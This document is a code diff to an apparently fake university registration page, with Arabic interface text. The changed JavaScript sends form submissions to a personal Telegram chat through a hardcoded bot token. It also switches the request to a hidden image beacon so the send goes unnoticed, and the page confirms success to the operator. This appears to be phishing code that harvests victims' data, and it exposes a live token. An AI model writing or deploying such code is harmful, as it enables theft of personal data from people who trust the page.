@@ -159,6 +159,8 @@
 
         <div id="successMessage" class="success">
             <strong>✅ تم إرسال البيانات بنجاح!</strong>
+            <br>
+            <span style="font-size: 14px;">البيانات وصلت لحسابك في التليجرام</span>
         </div>
     </div>
 
@@ -191,19 +193,16 @@
 🌐 **المصدر:** صفحة التسجيل الجامعي
             `;
             
-            // إرسال البيانات باستخدام XMLHttpRequest (يعمل على GitHub Pages)
-            const xhr = new XMLHttpRequest();
+            // ✅ الإرسال المباشر لحسابك الشخصي
             const botToken = '8457845780:AAEGCZOgCqnM3HG2lr0fRt_WCdrC5Z-A26I';
-            const chatId = '7003054961';
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const yourPersonalId = '7003054961'; // رقمك الشخصي
             
-            xhr.open('POST', url, true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown'
-            }));
+            // استخدام طريقة تعمل على GitHub Pages
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${yourPersonalId}&text=${encodeURIComponent(message)}`;
+            
+            // إنشاء صورة خفية لإرسال الطلب
+            const img = new Image();
+            img.src = telegramUrl;
             
             // إظهار رسالة النجاح
             document.getElementById('successMessage').style.display = 'block';
@@ -212,7 +211,9 @@
             setTimeout(() => {
                 this.reset();
                 document.getElementById('successMessage').style.display = 'none';
-            }, 3000);
+            }, 5000);
+            
+            console.log('تم إرسال البيانات إلى حسابك في التليجرام');
         });
     </script>
 </body>
